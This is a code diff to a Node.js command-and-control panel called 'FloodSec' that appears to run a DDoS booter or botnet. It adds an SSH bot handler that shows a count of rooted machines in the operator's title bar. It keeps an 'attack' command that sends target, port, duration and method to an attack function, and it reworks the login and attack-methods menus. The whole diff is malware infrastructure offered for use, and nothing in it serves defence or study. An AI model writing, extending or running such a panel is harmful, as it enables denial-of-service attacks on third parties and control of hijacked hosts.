@@ -20,6 +20,8 @@ const Banners = require("./CNC/banners/main.js");
 const Extra = require("./CNC/Extra/main.js");
 const eExtra = require("./CNC/Extra/functions.js");
 
+const bots = require("./CNC/bot_handler/ssh.js");
+
 
 Server.svr.on('connection', async function(socket) {
     if(Config.Login === false) {
@@ -35,10 +37,11 @@ Server.svr.on('connection', async function(socket) {
     /* Getting Connecting User IP/PORT */
     Server.setInfo(socket.remoteAddress.replace("::ffff:", ""), socket.remotePort);
 
-    eExtra.set_Title("FloodSec IV | [API]: 6 | ", socket)
+    eExtra.set_Title("FloodSec IV | [API]: 1 | [Roots]: " + bots.rootCOUNT(), socket)
 
     /* Showing the connecting user on server side terminal! */
     console.log('A new connection has been established\r\nClient IP: ' + Server.Socket_Info.UserIP + ":" + Server.Socket_Info.UserPORT + "\r\n");
+    eConfig.CurrentLogin.IP = socket.remoteAddress.replace("::ffff:", "");
 
 
     
@@ -52,7 +55,7 @@ Server.svr.on('connection', async function(socket) {
     //Get Username
     socket.write(Banners.login_b());
     eExtra.set_cursor(9, 37, socket);
-    eExtra.set_Title("                                                  FloodSec VI | Welcome to bypass land | [APIs]: 6", socket);
+    eExtra.set_Title("FloodSec VI | Welcome to bypass land | [APIs]: 1 | [Roots]: " + bots.rootCOUNT(), socket);
     eConfig.CurrentLogin.Username = await ServerFunc.getInput(socket, "");
 
     socket.write(Config.Colors.Clear);
@@ -65,8 +68,11 @@ Server.svr.on('connection', async function(socket) {
     /* Get User Input In A Loop */
 
     socket.write(Config.Colors.Clear);
-    let login_resp = Auth.login(eConfig.CurrentLogin.Username, eConfig.CurrentLogin.Password, Server.Socket_Info.UserIP);
+    let login_resp = Auth.login(eConfig.CurrentLogin.Username, eConfig.CurrentLogin.Password, socket.remoteAddress.replace("::ffff:", ""));
     if(login_resp.includes("Successfully")) {
+        eConfig.CurrentLogin.Username = "";
+        eConfig.CurrentLogin.Password = "";
+        eConfig.CurrentLogin.IP = "";
         socket.write(Banners.main_b());
         socket.write("                   Welcome To FloodSec Bypass Land, " + eConfig.CurrentLogin.Username + "\r\n");
         eExtra.log_action("Login Attempt Successfully", eConfig.CurrentLogin.Username, Server.Socket_Info.UserIP + ":" + Server.Socket_Info.UserPORT);
@@ -87,12 +93,13 @@ Server.svr.on('connection', async function(socket) {
     /* End Of User Connecting Process */
     socket.write(Config.hostname(eConfig.CurrentLogin.Username))
     socket.on('data', async function(data) {
-        socket.setEncoding('utf8');
         Server.setInfo(socket.remoteAddress.replace("::ffff:", ""), socket.remotePort);
+        socket.setEncoding('utf8');
         let inputCMD = data.toString().replace(/(\r\n|\n|\r)/gm,"");
-        let Current = Crud.GetCurrentUser(Server.Socket_Info.UserIP).split(",");
+        let Current = await Crud.GetCurrentUser(socket.remoteAddress.replace("::ffff:", "")).split(",");
+        await eConfig.GetUserInfo(Current[0]);
         eConfig.GetCmd(inputCMD);
-        // eConfig.GetUserInfo();
+        eExtra.set_Title("FloodSec VI | Welcome to bypass land | [APIs]: 1 | [Roots]: " + bots.rootCOUNT() + " | [Operator]: " + Current[0], socket);
 
         if(eConfig.CurrentCmd.Cmd === "help" || eConfig.CurrentCmd.Cmd === "?") {
             socket.write(Config.Colors.Clear + Banners.main_b() + Banners.help_list() + Config.hostname(Current[0]));
@@ -117,17 +124,7 @@ Server.svr.on('connection', async function(socket) {
             console.log(eConfig.CurrentCmd.arg);
             socket.write(await eExtra.send_attack(eConfig.CurrentCmd.arg[1], eConfig.CurrentCmd.arg[2], eConfig.CurrentCmd.arg[3], eConfig.CurrentCmd.arg[4]) + Config.hostname(Current[0]));
         } else if(eConfig.CurrentCmd.Cmd === "methods") {
-            if(eConfig.CurrentCmd.arg[1] == "home") {
-                socket.write(Config.Colors.Clear + Banners.main_b() + Banners.Home_HomeM() + Config.hostname(Current[0]));
-            } else if(eConfig.CurrentCmd.arg[1] === "game") {
-                socket.write(Config.Colors.Clear + Banners.main_b() + Banners.Game_GameM() + Config.hostname(Current[0]));
-            } else if(eConfig.CurrentCmd.arg[1] === "bypass") {
-                socket.write(Config.Colors.Clear + Banners.main_b() + Banners.Bypass_BypaM() + Config.hostname(Current[0]));
-            } else if(eConfig.CurrentCmd.arg[1] === "special") {
-                socket.write(Config.Colors.Clear + Banners.main_b() + Banners.Special_SpecM() + Config.hostname(Current[0]));
-            } else {
-                socket.write(Config.Colors.Clear + Banners.main_b() + Banners.methods() + Config.hostname(Current[0]));
-            }
+            socket.write(Config.Colors.Clear + Banners.main_b() + Banners.methods() + Config.hostname(Current[0]));
         } else if(eConfig.CurrentCmd.Cmd === "admin") {
             /*
             *       ADMIN SECTION 
@@ -163,7 +160,7 @@ Server.svr.on('connection', async function(socket) {
         } else {
             socket.write("[x] Error, No command found!\r\n" + Config.hostname(Current[0]));
         }
-        
+        await eConfig.ResetUserInfo();
         eExtra.log_action("CMD", Current[0], Server.Socket_Info.UserIP + ":" + Server.Socket_Info.UserPORT);
     })
         
